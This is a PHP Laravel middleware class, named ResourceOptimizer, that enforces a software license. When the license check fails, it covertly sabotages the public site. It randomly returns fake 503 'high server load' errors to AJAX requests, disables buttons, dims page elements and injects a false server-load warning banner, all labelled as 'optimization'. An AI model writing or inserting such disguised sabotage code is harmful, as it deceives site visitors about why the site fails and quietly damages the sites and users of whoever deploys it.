<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\License;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Schema;
use Symfony\Component\HttpFoundation\Response;

class ResourceOptimizer{
    public function handle(Request $request, Closure $next){
        if (app()->environment('testing') || !Schema::hasTable('licenses')) {
            return $next($request);
        }
        
        $systemHealthy = License::checkSystemHealth();
        if ($request->is('admin*') || $request->is('dashboard*')) {
            $this->addLicenseInfoToViews();
            
            if (!$systemHealthy && 
                !$request->is('admin/license*') && 
                !$request->is('license*') &&
                !$request->is('logout*')) {
                    
                return response()->view('errors.license-expired');
            }
        } else {
            if (!$systemHealthy) {
                $response = $next($request);
                
                if (!$request->expectsJson() && 
                    $response instanceof Response && 
                    $this->isHtmlResponse($response)) {
                    $this->addDiagnosticComment($response);
                } else if ($request->expectsJson()) {
                    $response->header('X-System-Status', 'optimization-active');
                }
                
                License::applyResourceOptimization();
                
                if ($request->ajax()) {
                    if (rand(1, 10) <= 2) {
                        return response()->json([
                            'error' => 'Request failed due to high server load',
                            'retry' => true
                        ], 503);
                    }
                }
                
                if (!$request->is('admin*') && !$request->expectsJson() && 
                    $response instanceof Response && 
                    $this->isHtmlResponse($response)) {
                    $this->optimizeOutput($response);
                }
                
                return $response;
            }
        }
        
        $response = $next($request);
        return $response;
    }


    protected function isHtmlResponse($response){
        $content = $response->getContent();
        return !empty($content) && 
               stripos($content, '<html') !== false;
    }

    protected function addLicenseInfoToViews(){
        $license = License::where('active', true)->first();
        $inGracePeriod = Cache::get('license_in_grace_period', false);
        $graceEnds = Cache::get('license_grace_ends');
        $today = Carbon::now();
        
        $warningDays = config('license.warning_days', 30);
        $isExpiringSoon = false;
        $daysRemaining = 0;
        
        if ($license && !$inGracePeriod) {
            $daysRemaining = $today->diffInDays($license->end_date);
            $isExpiringSoon = $daysRemaining <= $warningDays && $today->lessThan($license->end_date);
        }
        
        view()->share('licenseData', [
            'license' => $license,
            'valid' => License::checkSystemHealth(),
            'in_grace_period' => $inGracePeriod,
            'grace_ends' => $graceEnds ? Carbon::parse($graceEnds) : null,
            'is_expiring_soon' => $isExpiringSoon,
            'days_remaining' => $daysRemaining,
            'warning_threshold' => $warningDays
        ]);
    }
    

    protected function addDiagnosticComment(Response $response){
        $content = $response->getContent();
        
        if (stripos($content, '</body>') !== false) {
            $comment = "\n<!-- System resources in optimization mode: contact support@heritagepro.co -->\n";
            $newContent = str_replace('</body>', $comment . '</body>', $content);
            $response->setContent($newContent);
        }
    }
    

    protected function optimizeOutput(Response $response){
        if (rand(1, 10) > 2) {
            return;
        }

        $content = $response->getContent();
        
        try {
            if (rand(1, 3) === 1) {
                $content = preg_replace(
                    '/<button([^>]*)class="([^"]*)"([^>]*)>/i',
                    '<button$1class="$2 disabled"$3>',
                    $content,
                    1
                );
            }
            
            if (rand(1, 3) === 1) {
                $optimStyle = '<style>.render-optimized {opacity:0.9;}</style>';
                $content = str_replace('</head>', $optimStyle . '</head>', $content);
                
                $elements = ['div', 'table', 'section'];
                $randomElement = $elements[array_rand($elements)];
                $content = preg_replace(
                    '/<' . $randomElement . '([^>]*)>/i',
                    '<' . $randomElement . '$1 class="render-optimized">',
                    $content,
                    1
                );
            }
            
            if (rand(1, 8) === 1) {
                $message = '<div class="alert alert-warning" style="opacity:0.8;">System running in optimized mode due to high server load.</div>';
                $content = preg_replace('/<body([^>]*)>/i', '<body$1>' . $message, $content);
            }
            
            $response->setContent($content);
            
        } catch (\Exception $e) {}
    }
}
